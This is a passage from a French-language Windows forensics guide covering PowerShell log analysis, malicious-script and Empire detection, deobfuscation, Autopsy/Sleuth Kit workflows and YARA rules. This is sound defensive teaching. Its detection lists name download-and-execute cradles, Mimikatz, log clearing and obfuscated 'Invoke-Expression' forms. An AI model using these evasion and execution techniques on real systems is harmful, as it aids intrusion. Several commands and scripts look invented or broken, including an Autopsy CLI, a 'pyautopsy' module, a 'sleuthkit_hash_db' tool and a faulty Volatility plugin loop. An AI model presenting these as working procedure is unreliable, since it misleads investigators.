@{Source=\"ETW\"; Event=$_} }\n    $allEvents += $systemEvents | ForEach-Object { @{Source=\"System\"; Event=$_} }\n    $allEvents += $securityEvents | ForEach-Object { @{Source=\"Security\"; Event=$_} }\n\n    $timeline = $allEvents | Sort-Object {$_.Event.TimeCreated}\n\n    # Exporter la timeline\n    $timeline | ForEach-Object {\n        [PSCustomObject]@{\n            TimeCreated = $_.Event.TimeCreated\n            Source = $_.Source\n            Id = $_.Event.Id\n            Level = $_.Event.LevelDisplayName\n            Message = $_.Event.Message\n        }\n    } | Export-Csv -Path \"incident_timeline.csv\" -NoTypeInformation\n}\n</code></pre></p>"},{"location":"specific-artifacts/#analyse-des-anomalies","title":"Analyse des anomalies","text":"<p>D\u00e9tection d'anomalies de performance <pre><code>function Detect-PerformanceAnomalies {\n    param([string]$ETLFile)\n\n    # Analyser les m\u00e9triques de performance\n    $performanceScript = @\"\n    trace = Analysis()\n    trace.open('$ETLFile')\n\n    # CPU Usage\n    cpu_table = trace.get_table('CPU Usage (Sampled)')\n    cpu_usage = {}\n\n    for row in cpu_table:\n        process = row.Process\n        if process not in cpu_usage:\n            cpu_usage[process] = 0\n        cpu_usage[process] += row.Weight\n\n    # D\u00e9tecter les processus avec utilisation CPU \u00e9lev\u00e9e\n    for process, usage in cpu_usage.items():\n        if usage &gt; 80:  # Plus de 80% CPU\n            print(f\"High CPU usage: {process} - {usage}%\")\n\n    # Memory Usage\n    memory_table = trace.get_table('Virtual Memory Snapshots')\n    memory_usage = {}\n\n    for row in memory_table:\n        process = row.Process\n        if process not in memory_usage:\n            memory_usage[process] = 0\n        memory_usage[process] += row.Size\n\n    # D\u00e9tecter les processus avec utilisation m\u00e9moire \u00e9lev\u00e9e\n    for process, usage in memory_usage.items():\n        if usage &gt; 1073741824:  # Plus de 1GB\n            print(f\"High memory usage: {process} - {usage/1073741824:.2f}GB\")\n\"@\n\n    $performanceScript | Out-File -FilePath \"detect_anomalies.py\"\n    wpa.exe -i $ETLFile -script detect_anomalies.py\n}\n</code></pre></p>"},{"location":"specific-artifacts/#optimisation-des-analyses","title":"Optimisation des analyses","text":""},{"location":"specific-artifacts/#filtrage-des-donnees","title":"Filtrage des donn\u00e9es","text":"<p>Filtres WPA <pre><code>&lt;!-- Filtre pour processus sp\u00e9cifiques --&gt;\n&lt;Filter Name=\"SuspiciousProcesses\"&gt;\n  &lt;Column Name=\"Process\"&gt;\n    &lt;Value&gt;powershell.exe&lt;/Value&gt;\n    &lt;Value&gt;cmd.exe&lt;/Value&gt;\n    &lt;Value&gt;rundll32.exe&lt;/Value&gt;\n    &lt;Value&gt;regsvr32.exe&lt;/Value&gt;\n  &lt;/Column&gt;\n&lt;/Filter&gt;\n\n&lt;!-- Filtre temporel --&gt;\n&lt;Filter Name=\"IncidentTimeframe\"&gt;\n  &lt;Column Name=\"TimeStamp\"&gt;\n    &lt;Range Start=\"2024-01-15T14:00:00\" End=\"2024-01-15T16:00:00\"/&gt;\n  &lt;/Column&gt;\n&lt;/Filter&gt;\n</code></pre></p>"},{"location":"specific-artifacts/#powershell-forensics-analyse-des-scripts","title":"PowerShell Forensics - Analyse des scripts","text":""},{"location":"specific-artifacts/#vue-densemble-de-powershell-forensics","title":"Vue d'ensemble de PowerShell Forensics","text":"<p>PowerShell \u00e9tant largement utilis\u00e9 par les attaquants, son analyse forensique est cruciale pour comprendre les activit\u00e9s malveillantes.</p>"},{"location":"specific-artifacts/#sources-dartefacts-powershell","title":"Sources d'artefacts PowerShell","text":"<p>Logs PowerShell - Microsoft-Windows-PowerShell/Operational - Microsoft-Windows-PowerShell/Analytic - Windows PowerShell.evtx</p> <p>Fichiers de configuration - Profile.ps1 - Modules personnalis\u00e9s - Historique des commandes</p> <p>Artefacts m\u00e9moire - Processus PowerShell - Modules charg\u00e9s - Variables d'environnement</p>"},{"location":"specific-artifacts/#logs-powershell","title":"Logs PowerShell","text":""},{"location":"specific-artifacts/#configuration-du-logging","title":"Configuration du logging","text":"<p>Activation du logging avanc\u00e9 <pre><code># Via Group Policy ou Registry\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\" -Name \"EnableModuleLogging\" -Value 1\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" -Name \"EnableScriptBlockLogging\" -Value 1\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" -Name \"EnableTranscripting\" -Value 1\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" -Name \"OutputDirectory\" -Value \"C:\\PSTranscripts\"\n</code></pre></p> <p>Configuration via GPO <pre><code>&lt;!-- PowerShell Logging GPO --&gt;\n&lt;policy&gt;\n  &lt;name&gt;Turn on PowerShell Script Block Logging&lt;/name&gt;\n  &lt;state&gt;Enabled&lt;/state&gt;\n  &lt;registry&gt;\n    &lt;path&gt;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging&lt;/path&gt;\n    &lt;value name=\"EnableScriptBlockLogging\" type=\"REG_DWORD\" data=\"1\"/&gt;\n  &lt;/registry&gt;\n&lt;/policy&gt;\n</code></pre></p>"},{"location":"specific-artifacts/#analyse-des-logs","title":"Analyse des logs","text":"<p>Event ID 4104 - Script Block Logging <pre><code># Analyser les script blocks\nGet-WinEvent -FilterHashtable @{LogName=\"Microsoft-Windows-PowerShell/Operational\"; ID=4104} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $scriptBlock = ($eventData | Where-Object {$_.Name -eq \"ScriptBlockText\"}).'#text'\n    $scriptBlockId = ($eventData | Where-Object {$_.Name -eq \"ScriptBlockId\"}).'#text'\n    $path = ($eventData | Where-Object {$_.Name -eq \"Path\"}).'#text'\n\n    [PSCustomObject]@{\n        TimeCreated = $_.TimeCreated\n        ScriptBlockId = $scriptBlockId\n        Path = $path\n        ScriptBlock = $scriptBlock\n    }\n} | Where-Object {$_.ScriptBlock -match \"invoke-|download|iex|iwr|empire|mimikatz\"}\n</code></pre></p> <p>Event ID 4103 - Module Logging <pre><code># Analyser les modules charg\u00e9s\nGet-WinEvent -FilterHashtable @{LogName=\"Microsoft-Windows-PowerShell/Operational\"; ID=4103} | ForEach-Object {\n    $event = [xml]$_.ToXml()\n    $eventData = $event.Event.EventData.Data\n\n    $commandName = ($eventData | Where-Object {$_.Name -eq \"CommandName\"}).'#text'\n    $commandType = ($eventData | Where-Object {$_.Name -eq \"CommandType\"}).'#text'\n    $hostName = ($eventData | Where-Object {$_.Name -eq \"HostName\"}).'#text'\n    $commandLine = ($eventData | Where-Object {$_.Name -eq \"CommandLine\"}).'#text'\n\n    [PSCustomObject]@{\n        TimeCreated = $_.TimeCreated\n        CommandName = $commandName\n        CommandType = $commandType\n        HostName = $hostName\n        CommandLine = $commandLine\n    }\n}\n</code></pre></p>"},{"location":"specific-artifacts/#analyse-des-scripts-malveillants","title":"Analyse des scripts malveillants","text":""},{"location":"specific-artifacts/#detection-de-patterns-malveillants","title":"D\u00e9tection de patterns malveillants","text":"<p>Indicateurs communs <pre><code>function Detect-MaliciousPatterns {\n    param([string]$ScriptContent)\n\n    $maliciousPatterns = @(\n        \"Invoke-Expression\",\n        \"IEX\",\n        \"Invoke-WebRequest\",\n        \"IWR\",\n        \"DownloadString\",\n        \"DownloadFile\",\n        \"System.Net.WebClient\",\n        \"New-Object Net.WebClient\",\n        \"Start-Process\",\n        \"cmd.exe /c\",\n        \"powershell.exe -e\",\n        \"powershell.exe -en\",\n        \"powershell.exe -enc\",\n        \"FromBase64String\",\n        \"Convert.*Base64\",\n        \"Reflection.Assembly\",\n        \"System.Reflection.Assembly\",\n        \"Load.*Assembly\",\n        \"Invoke-Mimikatz\",\n        \"Invoke-Kerberoast\",\n        \"Invoke-BloodHound\",\n        \"Empire\",\n        \"Metasploit\",\n        \"Meterpreter\",\n        \"Add-Type\",\n        \"DllImport\",\n        \"VirtualAlloc\",\n        \"CreateThread\",\n        \"WaitForSingleObject\",\n        \"kernel32\",\n        \"ntdll\",\n        \"Get-Process.*Stop-Process\",\n        \"Get-Service.*Stop-Service\",\n        \"Remove-Item.*-Recurse\",\n        \"Clear-EventLog\",\n        \"wevtutil.*cl\",\n        \"Get-EventLog.*Clear-EventLog\"\n    )\n\n    $detectedPatterns = @()\n\n    foreach ($pattern in $maliciousPatterns) {\n        if ($ScriptContent -match $pattern) {\n            $detectedPatterns += $pattern\n        }\n    }\n\n    return $detectedPatterns\n}\n\n# Exemple d'utilisation\n$scriptContent = Get-Content \"suspicious_script.ps1\" -Raw\n$patterns = Detect-MaliciousPatterns -ScriptContent $scriptContent\nif ($patterns) {\n    Write-Host \"Malicious patterns detected: $($patterns -join ', ')\"\n}\n</code></pre></p>"},{"location":"specific-artifacts/#deobfuscation-de-scripts","title":"D\u00e9obfuscation de scripts","text":"<p>D\u00e9obfuscation basique <pre><code>function Deobfuscate-PowerShellScript {\n    param([string]$ObfuscatedScript)\n\n    # Remplacer les variables communes\n    $deobfuscated = $ObfuscatedScript\n    $deobfuscated = $deobfuscated -replace '\\$env:.*?\\+', ''\n    $deobfuscated = $deobfuscated -replace '\\${.*?}', 'VAR'\n    $deobfuscated = $deobfuscated -replace '\\[char\\]\\d+', 'CHAR'\n\n    # D\u00e9coder Base64\n    $base64Pattern = '[A-Za-z0-9+/]+=*'\n    $base64Matches = [regex]::Matches($deobfuscated, $base64Pattern)\n\n    foreach ($match in $base64Matches) {\n        if ($match.Value.Length -gt 20) {\n            try {\n                $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($match.Value))\n                $deobfuscated = $deobfuscated.Replace($match.Value, $decoded)\n            } catch {\n                # Ignore invalid base64\n            }\n        }\n    }\n\n    # Remplacer les concat\u00e9nations\n    $deobfuscated = $deobfuscated -replace '\\+\\s*', ''\n    $deobfuscated = $deobfuscated -replace \"''\\s*\\+\\s*''\"\n\n    return $deobfuscated\n}\n</code></pre></p>"},{"location":"specific-artifacts/#techniques-devasion-powershell","title":"Techniques d'\u00e9vasion PowerShell","text":""},{"location":"specific-artifacts/#obfuscation-courante","title":"Obfuscation courante","text":"<p>Invoke-Obfuscation <pre><code># Exemples d'obfuscation d\u00e9tect\u00e9s\n$obfuscatedExamples = @(\n    # Concatenation\n    \"('In'+'voke-Ex'+'pression')\",\n\n    # Character codes\n    \"[char]73+[char]110+[char]118+[char]111+[char]107+[char]101\",\n\n    # Variable substitution\n    '$a='+\"'\"+'Invoke-Expression'+\"'\"+';IEX $a',\n\n    # Format strings\n    \"'{0}{1}{2}' -f 'Inv','oke-Ex','pression'\",\n\n    # Reverse strings\n    \"'noisserpxE-ekovnI'[-1..-16] -join ''\",\n\n    # Base64 encoding\n    \"([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW52b2tlLUV4cHJlc3Npb24=')))\"\n)\n</code></pre></p>"},{"location":"specific-artifacts/#detection-devasion","title":"D\u00e9tection d'\u00e9vasion","text":"<p>Analyse des techniques d'\u00e9vasion <pre><code>function Detect-EvasionTechniques {\n    param([string]$ScriptContent)\n\n    $evasionTechniques = @()\n\n    # D\u00e9tection de base64\n    if ($ScriptContent -match 'FromBase64String|Convert.*Base64') {\n        $evasionTechniques += \"Base64 Encoding\"\n    }\n\n    # D\u00e9tection de concat\u00e9nation\n    if ($ScriptContent -match \"'\\+'|''\\s*\\+\\s*''\") {\n        $evasionTechniques += \"String Concatenation\"\n    }\n\n    # D\u00e9tection de format strings\n    if ($ScriptContent -match '-f\\s+') {\n        $evasionTechniques += \"Format String\"\n    }\n\n    # D\u00e9tection de caract\u00e8res ASCII\n    if ($ScriptContent -match '\\[char\\]\\d+') {\n        $evasionTechniques += \"ASCII Character Codes\"\n    }\n\n    # D\u00e9tection de variables\n    if ($ScriptContent -match '\\$\\w+\\s*=\\s*[''\"].*[''\"]') {\n        $evasionTechniques += \"Variable Substitution\"\n    }\n\n    # D\u00e9tection de compression\n    if ($ScriptContent -match 'IO\\.Compression|GZipStream') {\n        $evasionTechniques += \"Compression\"\n    }\n\n    # D\u00e9tection de split/join\n    if ($ScriptContent -match 'split|join') {\n        $evasionTechniques += \"Split/Join Operations\"\n    }\n\n    return $evasionTechniques\n}\n</code></pre></p>"},{"location":"specific-artifacts/#outils-danalyse-powershell","title":"Outils d'analyse PowerShell","text":""},{"location":"specific-artifacts/#powershell-empire-detection","title":"PowerShell Empire Detection","text":"<p>D\u00e9tection d'Empire <pre><code>function Detect-PowerShellEmpire {\n    param([string]$LogPath)\n\n    $empireIndicators = @(\n        \"Microsoft.PowerShell.Commands.InvokeExpressionCommand\",\n        \"System.Management.Automation.AmsiUtils\",\n        \"Invoke-Empire\",\n        \"powershell.exe.*-W Hidden.*-nop\",\n        \"powershell.exe.*-windowstyle hidden\",\n        \"Empire\",\n        \"stage0\",\n        \"stage1\",\n        \"stage2\",\n        \"checkin\",\n        \"tasking\",\n        \"JobTracking\",\n        \"StagingKey\",\n        \"SessionKey\"\n    )\n\n    $empireEvents = Get-WinEvent -Path $LogPath -FilterHashtable @{LogName=\"Microsoft-Windows-PowerShell/Operational\"} | Where-Object {\n        $message = $_.Message\n        $empireIndicators | Where-Object { $message -match $_ }\n    }\n\n    return $empireEvents\n}\n</code></pre></p>"},{"location":"specific-artifacts/#revoke-obfuscation","title":"Revoke-Obfuscation","text":"<p>Utilisation de Revoke-Obfuscation <pre><code>Import-Module Revoke-Obfuscation\n\n# Analyser un script obfusqu\u00e9\n$scriptContent = Get-Content \"obfuscated_script.ps1\" -Raw\n$results = Measure-RvoObfuscation -ScriptBlock $scriptContent\n\n# Afficher les r\u00e9sultats\n$results | Format-Table -AutoSize\n</code></pre></p> <p>Cette approche compl\u00e8te permet d'analyser efficacement les artefacts ETW, les performances syst\u00e8me et les activit\u00e9s PowerShell dans un contexte forensique.</p>"},{"location":"tools-techniques/","title":"Outils et Techniques pour la Forensique Windows","text":""},{"location":"tools-techniques/#autopsy-et-sleuth-kit-suite-forensique-open-source","title":"Autopsy et Sleuth Kit - Suite forensique open source","text":""},{"location":"tools-techniques/#vue-densemble-dautopsy","title":"Vue d'ensemble d'Autopsy","text":"<p>Autopsy est une interface graphique open source pour The Sleuth Kit (TSK), offrant une plateforme compl\u00e8te d'analyse forensique num\u00e9rique.</p>"},{"location":"tools-techniques/#fonctionnalites-principales","title":"Fonctionnalit\u00e9s principales","text":"<p>Analyse d'images disque - Support des formats DD, E01, AFF - Analyse des syst\u00e8mes de fichiers - R\u00e9cup\u00e9ration de fichiers supprim\u00e9s - Analyse de la timeline</p> <p>Plugins int\u00e9gr\u00e9s - Hash lookup (NSRL, hashsets personnalis\u00e9s) - Keyword search - Email analysis - Registry analysis - Web artifacts - Multimedia file analysis</p>"},{"location":"tools-techniques/#installation-et-configuration","title":"Installation et configuration","text":""},{"location":"tools-techniques/#installation-sur-windows","title":"Installation sur Windows","text":"<p>Installation basique <pre><code># T\u00e9l\u00e9charger depuis https://www.autopsy.com/download/\n# Installation standard avec installateur MSI\n\n# V\u00e9rification de l'installation\nautopsy --version\n</code></pre></p> <p>Configuration initiale <pre><code># Cr\u00e9ation d'un cas\nautopsy --create-case \"Case001\" --case-dir \"C:\\Cases\\Case001\"\n\n# Ajout d'une image\nautopsy --add-data-source \"C:\\Evidence\\disk.dd\" --case-dir \"C:\\Cases\\Case001\"\n</code></pre></p>"},{"location":"tools-techniques/#configuration-avancee","title":"Configuration avanc\u00e9e","text":"<p>Configuration des index <pre><code># autopsy.conf\nindex.enable=true\nindex.path=C:\\AutopsyIndex\nindex.chunk.size=32\nindex.threads=4\n\n# Configuration Solr\nsolr.server=localhost\nsolr.port=8983\nsolr.collection=autopsy\n</code></pre></p> <p>Hashsets personnalis\u00e9s <pre><code># Cr\u00e9ation d'un hashset\nsleuthkit_hash_db -d hashset.db create\n\n# Ajout de hashs\nsleuthkit_hash_db -d hashset.db add C:\\hashs\\malware_hashes.txt\n\n# Configuration dans Autopsy\n# Tools -&gt; Options -&gt; Global Hash Set Lookup\n</code></pre></p>"},{"location":"tools-techniques/#analyse-dimages-disque","title":"Analyse d'images disque","text":""},{"location":"tools-techniques/#processus-danalyse","title":"Processus d'analyse","text":"<p>\u00c9tapes d'analyse 1. Cr\u00e9ation du cas 2. Ajout des sources de donn\u00e9es 3. Configuration des modules 4. Lancement de l'analyse 5. Examen des r\u00e9sultats</p> <p>Script d'analyse automatis\u00e9e <pre><code>import pyautopsy\n\ndef automated_analysis(case_name, evidence_path):\n    # Cr\u00e9er un nouveau cas\n    case = pyautopsy.Case(case_name)\n\n    # Ajouter l'image disque\n    data_source = case.add_data_source(evidence_path)\n\n    # Configurer les modules\n    modules = [\n        'Hash Lookup',\n        'File Type Identification',\n        'Keyword Search',\n        'Email Parser',\n        'Registry Analysis',\n        'Web Artifacts',\n        'Recent Activity',\n        'Interesting Files'\n    ]\n\n    # Lancer l'analyse\n    case.run_ingest(data_source, modules)\n\n    # Attendre la fin de l'analyse\n    case.wait_for_completion()\n\n    # G\u00e9n\u00e9rer un rapport\n    report = case.generate_report()\n    return report\n</code></pre></p>"},{"location":"tools-techniques/#modules-danalyse","title":"Modules d'analyse","text":"<p>Hash Lookup Module <pre><code># Configuration du module Hash Lookup\nhash_config = {\n    'nsrl_path': 'C:\\\\NSRL\\\\NSRLFile.txt',\n    'custom_hashsets': [\n        'C:\\\\Hashsets\\\\malware_hashes.db',\n        'C:\\\\Hashsets\\\\known_good.db'\n    ],\n    'alert_on_no_hash': True,\n    'calculate_md5': True,\n    'calculate_sha1': True,\n    'calculate_sha256': True\n}\n</code></pre></p> <p>Keyword Search Module <pre><code># Configuration des mots-cl\u00e9s\nkeyword_lists = {\n    'malware_indicators': [\n        'backdoor', 'trojan', 'virus', 'rootkit',\n        'keylogger', 'botnet', 'payload', 'exploit'\n    ],\n    'network_indicators': [\n        'http://', 'https://', 'ftp://', 'ssh://',\n        'tcp://', 'udp://', 'smb://', 'rdp://'\n    ],\n    'password_related': [\n        'password', 'passwd', 'pwd', 'login',\n        'credentials', 'authentication', 'token'\n    ],\n    'crypto_indicators': [\n        'bitcoin', 'cryptocurrency', 'wallet',\n        'mining', 'ransomware', 'encryption'\n    ]\n}\n</code></pre></p>"},{"location":"tools-techniques/#correlation-dartefacts","title":"Corr\u00e9lation d'artefacts","text":""},{"location":"tools-techniques/#analyse-de-timeline","title":"Analyse de timeline","text":"<p>Cr\u00e9ation de timeline <pre><code>def create_timeline(case_path, output_path):\n    # Utiliser TSK pour cr\u00e9er une timeline\n    import subprocess\n\n    # Commande fls pour lister les fichiers\n    fls_cmd = f\"fls -r -m / {case_path} &gt; {output_path}/bodyfile.txt\"\n    subprocess.run(fls_cmd, shell=True)\n\n    # Commande mactime pour cr\u00e9er la timeline\n    mactime_cmd = f\"mactime -b {output_path}/bodyfile.txt -d &gt; {output_path}/timeline.csv\"\n    subprocess.run(mactime_cmd, shell=True)\n\n    return f\"{output_path}/timeline.csv\"\n</code></pre></p> <p>Analyse de corr\u00e9lation <pre><code>def correlate_artifacts(case_path):\n    correlations = {}\n\n    # Corr\u00e9ler les artefacts web avec les fichiers t\u00e9l\u00e9charg\u00e9s\n    web_artifacts = get_web_artifacts(case_path)\n    downloads = get_downloaded_files(case_path)\n\n    for artifact in web_artifacts:\n        for download in downloads:\n            if abs((artifact.timestamp - download.timestamp).total_seconds()) &lt; 300:\n                correlations[artifact.url] = download.path\n\n    # Corr\u00e9ler les processus avec les fichiers cr\u00e9\u00e9s\n    processes = get_process_artifacts(case_path)\n    file_creations = get_file_creations(case_path)\n\n    for process in processes:\n        related_files = [f for f in file_creations \n                        if f.process_id == process.pid]\n        if related_files:\n            correlations[process.name] = related_files\n\n    return correlations\n</code></pre></p>"},{"location":"tools-techniques/#generation-de-rapports","title":"G\u00e9n\u00e9ration de rapports","text":""},{"location":"tools-techniques/#rapport-html","title":"Rapport HTML","text":"<p>Configuration du rapport <pre><code>report_config = {\n    'format': 'HTML',\n    'include_data_sources': True,\n    'include_results': True,\n    'include_tags': True,\n    'include_thumbnails': True,\n    'output_path': 'C:\\\\Reports\\\\Case001_Report.html'\n}\n</code></pre></p> <p>Rapport personnalis\u00e9 <pre><code>def generate_custom_report(case_path, template_path):\n    from jinja2 import Template\n\n    # Charger le template\n    with open(template_path, 'r') as f:\n        template = Template(f.read())\n\n    # Collecter les donn\u00e9es\n    data = {\n        'case_name': get_case_name(case_path),\n        'evidence_sources': get_evidence_sources(case_path),\n        'artifacts': get_all_artifacts(case_path),\n        'timeline': get_timeline_data(case_path),\n        'correlations': correlate_artifacts(case_path)\n    }\n\n    # G\u00e9n\u00e9rer le rapport\n    report_html = template.render(data)\n\n    # Sauvegarder\n    with open('custom_report.html', 'w') as f:\n        f.write(report_html)\n\n    return 'custom_report.html'\n</code></pre></p>"},{"location":"tools-techniques/#yara-rules-detection-de-patterns","title":"YARA Rules - D\u00e9tection de patterns","text":""},{"location":"tools-techniques/#vue-densemble-de-yara","title":"Vue d'ensemble de YARA","text":"<p>YARA est un outil de d\u00e9tection de patterns binaires et textuels, particuli\u00e8rement utile pour la classification de malwares et l'analyse forensique.</p>"},{"location":"tools-techniques/#syntaxe-de-base","title":"Syntaxe de base","text":"<p>Structure d'une r\u00e8gle YARA <pre><code>rule RuleName\n{\n    meta:\n        description = \"Description de la r\u00e8gle\"\n        author = \"Nom de l'auteur\"\n        date = \"2024-01-15\"\n        version = \"1.0\"\n\n    strings:\n        $string1 = \"pattern \u00e0 rechercher\"\n        $string2 = { 4D 5A }  // Hex pattern\n        $regex1 = /pattern regex/\n\n    condition:\n        $string1 or $string2 or $regex1\n}\n</code></pre></p>"},{"location":"tools-techniques/#creation-de-regles-yara","title":"Cr\u00e9ation de r\u00e8gles YARA","text":""},{"location":"tools-techniques/#regles-pour-malwares","title":"R\u00e8gles pour malwares","text":"<p>D\u00e9tection de packer UPX <pre><code>rule UPX_Packer\n{\n    meta:\n        description = \"D\u00e9tection du packer UPX\"\n        author = \"Forensic Analyst\"\n        date = \"2024-01-15\"\n\n    strings:\n        $upx1 = { 55 50 58 30 }  // UPX0\n        $upx2 = { 55 50 58 31 }  // UPX1\n        $upx3 = \"UPX!\"\n\n    condition:\n        uint16(0) == 0x5A4D and any of ($upx*)\n}\n</code></pre></p> <p>D\u00e9tection de techniques d'injection <pre><code>rule Process_Injection\n{\n    meta:\n        description = \"D\u00e9tection d'injection de processus\"\n        author = \"Forensic Analyst\"\n\n    strings:\n        $api1 = \"CreateRemoteThread\"\n        $api2 = \"VirtualAllocEx\"\n        $api3 = \"WriteProcessMemory\"\n        $api4 = \"OpenProcess\"\n        $api5 = \"QueueUserAPC\"\n\n    condition:\n        3 of ($api*)\n}\n</code></pre></p> <p>D\u00e9tection de persistance <pre><code>rule Windows_Persistence\n{\n    meta:\n        description = \"Techniques de persistance Windows\"\n\n    strings:\n        $reg1 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n        $reg2 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\"\n        $reg3 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\"\n        $sched1 = \"schtasks\" nocase\n        $sched2 = \"at.exe\" nocase\n        $service1 = \"sc create\"\n        $service2 = \"CreateService\"\n\n    condition:\n        any of ($reg*) or any of ($sched*) or any of ($service*)\n}\n</code></pre></p>"},{"location":"tools-techniques/#regles-pour-artefacts-forensiques","title":"R\u00e8gles pour artefacts forensiques","text":"<p>D\u00e9tection d'activit\u00e9 PowerShell malveillante <pre><code>rule Malicious_PowerShell\n{\n    meta:\n        description = \"D\u00e9tection de PowerShell malveillant\"\n\n    strings:\n        $ps1 = \"powershell.exe\" nocase\n        $ps2 = \"powershell -e\" nocase\n        $ps3 = \"powershell -enc\" nocase\n        $ps4 = \"Invoke-Expression\" nocase\n        $ps5 = \"IEX\" nocase\n        $ps6 = \"DownloadString\" nocase\n        $ps7 = \"Invoke-WebRequest\" nocase\n        $ps8 = \"FromBase64String\" nocase\n        $obf1 = \"char]\" nocase\n        $obf2 = \"join\" nocase\n        $obf3 = \"split\" nocase\n\n    condition:\n        any of ($ps*) and any of ($obf*)\n}\n</code></pre></p> <p>D\u00e9tection de traces de navigation <pre><code>rule Browser_Artifacts\n{\n    meta:\n        description = \"Artefacts de navigation web\"\n\n    strings:\n        $chrome1 = \"Google\\\\Chrome\\\\User Data\"\n        $chrome2 = \"History\"\n        $chrome3 = \"Cookies\"\n        $firefox1 = \"Mozilla\\\\Firefox\\\\Profiles\"\n        $firefox2 = \"places.sqlite\"\n        $firefox3 = \"cookies.sqlite\"\n        $edge1 = \"Microsoft\\\\Edge\\\\User Data\"\n\n    condition:\n        any of ($chrome*) or any of ($firefox*) or any of ($edge*)\n}\n</code></pre></p>"},{"location":"tools-techniques/#analyse-de-fichiers-suspects","title":"Analyse de fichiers suspects","text":""},{"location":"tools-techniques/#scan-de-fichiers","title":"Scan de fichiers","text":"<p>Scan basique <pre><code># Scan d'un fichier\nyara rules.yar suspicious_file.exe\n\n# Scan d'un r\u00e9pertoire\nyara -r rules.yar /path/to/directory\n\n# Scan avec m\u00e9tadonn\u00e9es\nyara -m rules.yar suspicious_file.exe\n\n# Scan avec tags\nyara -t rules.yar suspicious_file.exe\n</code></pre></p> <p>Scan avanc\u00e9 avec Python <pre><code>import yara\n\ndef scan_with_yara(rules_path, target_path):\n    # Compiler les r\u00e8gles\n    rules = yara.compile(filepath=rules_path)\n\n    # Scanner le fichier\n    matches = rules.match(target_path)\n\n    results = []\n    for match in matches:\n        result = {\n            'rule': match.rule,\n            'namespace': match.namespace,\n            'tags': match.tags,\n            'meta': match.meta,\n            'strings': []\n        }\n\n        for string_match in match.strings:\n            result['strings'].append({\n                'identifier': string_match.identifier,\n                'instances': string_match.instances\n            })\n\n        results.append(result)\n\n    return results\n\n# Utilisation\nresults = scan_with_yara('malware_rules.yar', 'suspicious_file.exe')\nfor result in results:\n    print(f\"Rule matched: {result['rule']}\")\n    print(f\"Description: {result['meta'].get('description', 'N/A')}\")\n</code></pre></p>"},{"location":"tools-techniques/#analyse-de-memoire","title":"Analyse de m\u00e9moire","text":"<p>Scan de dump m\u00e9moire <pre><code># Scan d'un dump m\u00e9moire avec YARA\nyara -s memory_rules.yar memory_dump.dmp\n\n# Avec Volatility\nvolatility -f memory_dump.dmp --profile=Win10x64 yarascan -y malware_rules.yar\n</code></pre></p> <p>R\u00e8gles sp\u00e9cifiques \u00e0 la m\u00e9moire <pre><code>rule Memory_Injection\n{\n    meta:\n        description = \"D\u00e9tection d'injection en m\u00e9moire\"\n\n    strings:\n        $mz = { 4D 5A }  // MZ header\n        $pe = { 50 45 00 00 }  // PE header\n        $inject1 = { 6A 00 68 00 30 00 00 68 00 00 40 00 6A 00 FF 15 }  // VirtualAllocEx pattern\n        $inject2 = { 6A 00 6A 00 6A 04 6A 00 6A 00 68 00 00 40 00 }  // WriteProcessMemory pattern\n\n    condition:\n        $mz at 0 and $pe and any of ($inject*)\n}\n</code></pre></p>"},{"location":"tools-techniques/#integration-avec-dautres-outils","title":"Int\u00e9gration avec d'autres outils","text":""},{"location":"tools-techniques/#integration-avec-autopsy","title":"Int\u00e9gration avec Autopsy","text":"<p>Plugin YARA pour Autopsy <pre><code># autopsy_yara_plugin.py\nimport yara\nfrom autopsy import IngestModule\n\nclass YaraIngestModule(IngestModule):\n    def __init__(self):\n        self.rules = None\n\n    def startUp(self, context):\n        # Charger les r\u00e8gles YARA\n        self.rules = yara.compile(filepath='rules/all_rules.yar')\n\n    def process(self, dataSource, progressBar):\n        # Obtenir tous les fichiers\n        files = dataSource.getFiles()\n\n        for file in files:\n            if file.isFile() and file.getSize() &gt; 0:\n                # Scanner le fichier\n                try:\n                    matches = self.rules.match(data=file.read())\n\n                    if matches:\n                        # Cr\u00e9er un artefact\n                        artifact = file.newArtifact(self.ARTIFACT_TYPE)\n                        artifact.addAttribute(self.ATTR_RULE, matches[0].rule)\n                        artifact.addAttribute(self.ATTR_DESCRIPTION, matches[0].meta.get('description', ''))\n\n                except Exception as e:\n                    self.log(f\"Error scanning file {file.getName()}: {e}\")\n\n        return IngestModule.ProcessResult.OK\n</code></pre></p>"},{"location":"tools-techniques/#integration-avec-volatility","title":"Int\u00e9gration avec Volatility","text":"<p>Plugin Volatility YARA <pre><code># volatility_yara_plugin.py\nimport yara\nimport volatility.plugins.common as common\nimport volatility.utils as utils\n\nclass YaraScanPlugin(common.AbstractWindowsCommand):\n    def __init__(self, config, *args, **kwargs):\n        common.AbstractWindowsCommand.__init__(self, config, *args, **kwargs)\n\n    def calculate(self):\n        # Compiler les r\u00e8gles YARA\n        rules = yara.compile(filepath=self._config.YARA_RULES)\n\n        # Scanner l'espace d'adressage\n        address_space = utils.load_as(self._config)\n\n        for offset in range(0, address_space.get_available_addresses()):\n            try:\n                data = address_space.read(offset, 0x1000)  # Lire 4KB\n                matches = rules.match(data=data)\n\n                if matches:\n                    yield (offset, matches)\n\n            except Exception:\n                continue\n\n    def render_text(self, outfd, data):\n        for offset, matches in data:\n            for match in matches:\n                outfd.write(f\"Rule: {match.rule} at offset 0x{offset:x}\\n\")\n                outfd.write(f\"Description: {match.meta.get('description', 'N/A')}\\n\")\n</code></pre></p>"},{"location":"tools-techniques/#optimisation-des-performances","title":"Optimisation des performances","text":""},{"location":"tools-techniques/#optimisation-des-regles","title":"Optimisation des 